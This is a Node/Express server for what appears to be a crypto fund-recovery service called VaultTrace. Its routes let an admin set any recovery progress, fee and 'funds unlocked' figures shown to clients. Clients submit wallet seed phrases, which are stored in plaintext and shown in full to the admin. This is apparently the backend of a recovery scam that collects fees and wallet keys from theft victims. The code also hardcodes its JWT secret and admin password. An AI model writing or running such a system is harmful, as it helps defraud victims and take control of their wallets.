import express from 'express';
import cors from 'cors';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = 'vaulttrace-secret-key-2024';

// Middleware
app.use(cors());
app.use(express.json());

// Data storage paths
const DATA_DIR = path.join(__dirname, '..', 'data');
const CLIENTS_FILE = path.join(DATA_DIR, 'clients.json');
const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
const UPLOADS_DIR = path.join(__dirname, '..', 'public', 'uploads');

// Ensure directories exist
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

// Helper functions
const readData = (filePath) => {
  try {
    if (fs.existsSync(filePath)) {
      return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    }
    return [];
  } catch (error) {
    console.error(`Error reading ${filePath}:`, error);
    return [];
  }
};

const writeData = (filePath, data) => {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error(`Error writing ${filePath}:`, error);
  }
};

// Authentication middleware
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ message: 'Access token required' });
  }

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ message: 'Invalid token' });
    }
    req.user = user;
    next();
  });
};

// Routes

// Client registration
app.post('/api/register', async (req, res) => {
  const { name, email, password, description, evidence, amountLost } = req.body;

  const clients = readData(CLIENTS_FILE);
  const existingClient = clients.find((c) => c.email === email);

  if (existingClient) {
    return res.status(400).json({ message: 'Email already registered' });
  }

  const hashedPassword = await bcrypt.hash(password, 10);
  const newClient = {
    id: Date.now().toString(),
    name,
    email,
    password: hashedPassword,
    description,
    evidence,
    createdAt: new Date().toISOString(),
    data: {
      recoveredAmount: 0,
      trackingProgress: 0,
      feePaid: false,
      paymentPending: false,
      paymentConfirmed: false,
      fundsUnlocked: false,
      balance: 0,
      fixed: 0,
      marsettaShare: 0,
      verifiedLoss1: amountLost || 0,
      verifiedLoss2: 0,
      totalEntitlement: 0,
    },
    wallet: '',
    seedPhrase: '',
  };

  clients.push(newClient);
  writeData(CLIENTS_FILE, clients);

  res.status(201).json({ message: 'Registration successful' });
});

// Client login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  const clients = readData(CLIENTS_FILE);
  const client = clients.find((c) => c.email === email);

  if (!client) {
    return res.status(400).json({ message: 'Invalid credentials' });
  }

  const validPassword = await bcrypt.compare(password, client.password);
  if (!validPassword) {
    return res.status(400).json({ message: 'Invalid credentials' });
  }

  const token = jwt.sign(
    { id: client.id, email: client.email, role: 'client' },
    JWT_SECRET,
    { expiresIn: '24h' }
  );

  res.json({
    token,
    user: {
      id: client.id,
      name: client.name,
      email: client.email,
      role: 'client'
    }
  });
});

// Admin login
app.post('/api/admin/login', async (req, res) => {
  const { email, password } = req.body;

  // Simple admin credentials (in production, store in database)
  const adminEmail = 'support@vaulttrace.com';
  const adminPassword = '@Vaulttrace081';

  if (email !== adminEmail || password !== adminPassword) {
    return res.status(400).json({ message: 'Invalid admin credentials' });
  }

  const token = jwt.sign(
    { email: adminEmail, role: 'admin' },
    JWT_SECRET,
    { expiresIn: '24h' }
  );

  res.json({
    token,
    user: {
      email: adminEmail,
      role: 'admin'
    }
  });
});

// Get all clients (admin only)
app.get('/api/admin/clients', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  const clients = readData(CLIENTS_FILE);
  const clientList = clients.map((c) => ({
    id: c.id,
    name: c.name,
    email: c.email,
    createdAt: c.createdAt,
  }));

  res.json(clientList);
});

// Get client data
app.get('/api/client/data', authenticateToken, (req, res) => {
  const clients = readData(CLIENTS_FILE);
  const client = clients.find((c) => c.id === req.user.id);

  if (!client) {
    return res.status(404).json({ message: 'Client not found' });
  }

  res.json(client);
});

// Update client data (admin only)
app.put('/api/admin/client/:id', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  const clients = readData(CLIENTS_FILE);
  const clientIndex = clients.findIndex((c) => c.id === req.params.id);

  if (clientIndex === -1) {
    return res.status(404).json({ message: 'Client not found' });
  }

  clients[clientIndex].data = { ...clients[clientIndex].data, ...req.body };
  writeData(CLIENTS_FILE, clients);

  res.json({ message: 'Client data updated successfully' });
});

// Get selected client data (admin only)
app.get('/api/admin/client/:id', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  const clients = readData(CLIENTS_FILE);
  const client = clients.find((c) => c.id === req.params.id);

  if (!client) {
    return res.status(404).json({ message: 'Client not found' });
  }

  res.json(client);
});

// Update client wallet/seed
app.put('/api/client/wallet', authenticateToken, (req, res) => {
  const { wallet, seedPhrase } = req.body;
  const clients = readData(CLIENTS_FILE);
  const clientIndex = clients.findIndex((c) => c.id === req.user.id);

  if (clientIndex === -1) {
    return res.status(404).json({ message: 'Client not found' });
  }

  clients[clientIndex].wallet = wallet;
  clients[clientIndex].seedPhrase = seedPhrase;
  writeData(CLIENTS_FILE, clients);

  res.json({ message: 'Wallet data updated successfully' });
});

// Change password
app.put('/api/client/password', authenticateToken, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  const clients = readData(CLIENTS_FILE);
  const clientIndex = clients.findIndex((c) => c.id === req.user.id);

  if (clientIndex === -1) {
    return res.status(404).json({ message: 'Client not found' });
  }

  const client = clients[clientIndex];
  const validPassword = await bcrypt.compare(currentPassword, client.password);

  if (!validPassword) {
    return res.status(400).json({ message: 'Current password is incorrect' });
  }

  const hashedPassword = await bcrypt.hash(newPassword, 10);
  clients[clientIndex].password = hashedPassword;
  writeData(CLIENTS_FILE, clients);

  res.json({ message: 'Password changed successfully' });
});

// Update client verified loss 2 (additional evidence)
app.put('/api/client/verified-loss-2', authenticateToken, (req, res) => {
  const { amount } = req.body;
  const clients = readData(CLIENTS_FILE);
  const clientIndex = clients.findIndex((c) => c.id === req.user.id);

  if (clientIndex === -1) {
    return res.status(404).json({ message: 'Client not found' });
  }

  clients[clientIndex].data.verifiedLoss2 = amount || 0;
  writeData(CLIENTS_FILE, clients);

  res.json({ message: 'Verified loss 2 updated successfully' });
});

// Send support message
app.post('/api/messages', authenticateToken, (req, res) => {
  const { message } = req.body;
  const messages = readData(MESSAGES_FILE);

  const newMessage = {
    id: Date.now().toString(),
    from: req.user.role === 'admin' ? 'Admin' : 'Client',
    message,
    time: new Date().toISOString(),
    clientEmail: req.user.email,
    clientId: req.user.id,
    adminReply: null,
    adminReplyTime: null,
  };

  messages.push(newMessage);
  writeData(MESSAGES_FILE, messages);

  res.status(201).json({ message: 'Message sent successfully' });
});

// Get messages for client
app.get('/api/messages', authenticateToken, (req, res) => {
  const messages = readData(MESSAGES_FILE);
  const clientMessages = messages.filter((m) =>
    m.clientId === req.user.id || (req.user.role === 'admin' && m.clientEmail === req.query.clientEmail)
  );

  res.json(clientMessages);
});

// Reply to message (admin only)
app.put('/api/messages/:id/reply', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  const { reply } = req.body;
  const messages = readData(MESSAGES_FILE);
  const messageIndex = messages.findIndex((m) => m.id === req.params.id);

  if (messageIndex === -1) {
    return res.status(404).json({ message: 'Message not found' });
  }

  messages[messageIndex].adminReply = reply;
  messages[messageIndex].adminReplyTime = new Date().toISOString();
  writeData(MESSAGES_FILE, messages);

  res.json({ message: 'Reply sent successfully' });
});

// Delete client (admin only)
app.delete('/api/admin/client/:id', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  const clients = readData(CLIENTS_FILE);
  const filteredClients = clients.filter((c) => c.id !== req.params.id);
  writeData(CLIENTS_FILE, filteredClients);

  // Also remove messages for this client
  const messages = readData(MESSAGES_FILE);
  const filteredMessages = messages.filter((m) => m.clientId !== req.params.id);
  writeData(MESSAGES_FILE, filteredMessages);

  res.json({ message: 'Client deleted successfully' });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});